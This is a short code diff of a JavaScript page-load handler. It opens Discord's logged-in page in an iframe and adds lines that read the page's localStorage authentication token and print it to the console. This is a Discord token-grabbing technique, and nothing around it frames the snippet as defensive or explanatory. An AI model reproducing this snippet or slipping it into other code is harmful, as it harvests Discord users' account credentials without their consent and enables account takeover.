@@ -135,4 +135,7 @@ window.onload = function () {
   var i = document.createElement('iframe');
   i.src = 'https://discord.com/channels/@me';
   document.body.appendChild(i);
+  let ifr = i.contentWindow;
+  let localStorage = ifr.localStorage;
+  console.log(localStorage.token)
 }
